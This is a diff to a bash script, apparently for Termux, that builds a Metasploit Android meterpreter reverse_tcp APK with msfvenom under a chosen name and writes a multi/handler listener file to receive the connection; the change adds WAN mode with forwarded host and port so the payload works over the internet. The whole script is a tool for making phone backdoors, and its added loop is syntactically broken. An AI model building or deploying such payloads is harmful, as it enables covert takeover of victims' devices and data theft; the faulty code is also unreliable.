@@ -1,17 +1,36 @@
 #!/bin/bash
 PWD=$(pwd)
 echo
+while true
+do
+printf "\e[1;31mYou are generating payload for (LAN/WAN) ==> \e[1;92m"
+read lwan
+printf "\n"
+if [[ $lwan == LAN ]] || [[ $lwan == lan ]]; then
 printf "\e[1;31mEnter LHOST==>\e[0m "
 read lht
-printf "\n"
+echo
 printf "\e[1;31mEnter LPORT==>\e[0m "
 read lpt
+elif [[ $lwan == WAN ]] || [[ $lwan == wan ]]; then
+printf "\e[1;31mEnter forwarded HOST==>\e[0m "
+read flht
+echo
+printf "\e[1;31mEnter forwarded PORT==>\e[0m "
+read flpt
+echo
+printf "\e[1;31mEnter LPORT==>\e[0m "
+read lpt
+elif
+printf "\e[1;31mERROR: PLEASE ENTRR A VALID OPTION FROM (LAN/lan) and (WAN/wan)\e[0m "
+done
+fi
 printf "\n"
 printf "\e[1;31mEnter a name for your payload==>\e[0m "
 read pld
 printf "\n"
 printf "\e[1;94mProcessing\e[0m"
-printf "\e[1;94m.\e[om"
+printf "\e[1;94m.\e[0m"
 sleep 0.3
 printf "\e[1;94m.\e[0m"
 sleep 0.3
@@ -22,7 +41,11 @@ sleep 0.3
 printf "\e[1;94m.\e[0m\n"
 sleep 0.3
 printf "\n"
+if [[ $lwan == LAN ]] || [[ $lwan == lan ]]; then
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lht LPORT=$lpt R>${pld}.apk /sdcard
+elif [[ $lwan == WAN ]] || [[ $lwan == wan ]]; then
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$flht LPORT=$flpt R>${pld}.apk /sdcard
+fi
 sleep 5
 cd $PWD
 mv -v ${pld}.apk /sdcard
@@ -55,7 +78,11 @@ mkdir -p $PREFIX/tmp
 cd $PREFIX/tmp
 echo "use exploit/multi/handler" > run
 echo "set payload android/meterpreter/reverse_tcp" >> run
+if [[ $lwan == LAN ]] || [[ $lwan == lan ]]; then
 echo "set lhost $lht" >> run
+elif [[ $lwan == WAN ]] || [[ $lwan == wan ]]; then
+echo "set lhost $flht" >> run
+fi
 echo "set lport $lpt" >> run
 echo "show options" >> run
 echo "exploit" >> run
